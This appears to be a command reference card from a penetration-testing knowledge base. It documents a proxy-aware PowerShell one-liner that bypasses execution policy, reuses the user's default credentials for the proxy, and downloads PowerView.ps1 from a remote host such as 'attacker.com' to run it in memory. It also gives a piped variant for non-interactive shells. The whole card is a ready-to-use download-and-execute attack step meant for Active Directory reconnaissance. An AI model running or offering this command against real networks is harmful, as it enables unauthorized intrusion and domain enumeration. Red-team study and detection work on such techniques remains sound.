---
type: command
executor: powershell
data: >-
  powershell -exec bypass -c "(New-Object
  Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$_URL/PowerView.ps1')|iex"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - powershell
  - download-execute
  - proxy
verified: true
validated: true
---

# Download-and-Execute-PowerView-Proxy-Aware

## Command

```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$_URL/PowerView.ps1')|iex"
```

## Description

This command downloads the PowerView.ps1 script from a remote URL using Invoke-WebRequest (iwr) in a proxy-aware manner, then executes it in memory via Invoke-Expression (iex). It configures the WebClient to use default network credentials for proxy authentication, bypassing execution policy with -exec bypass. Use this in corporate environments with proxies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Base URL or IP hosting the PowerView.ps1 file (e.g., http://10.10.10.10) | Yes |
| -exec bypass | Bypasses PowerShell execution policy restrictions | Yes |
| -c | Specifies the command string to execute | Yes |

## Examples

### Basic Usage

```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://attacker.com/PowerView.ps1')|iex"
```

### Alternative Piping Variant (for non-interactive shells)

```powershell
echo "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$_URL/PowerView.ps1')|iex" | powershell -noprofile -
```

## Expected Output

No direct output on success; the script loads silently into the session. Verify with `Get-NetDomain` (should return domain info if successful). Errors may include proxy auth failures or download issues.

## Related

- [[commands/Download-and-Execute-PowerView-Non-Proxy-Aware]]
- [[procedures/Download-and-Execute-PowerView-Script]]
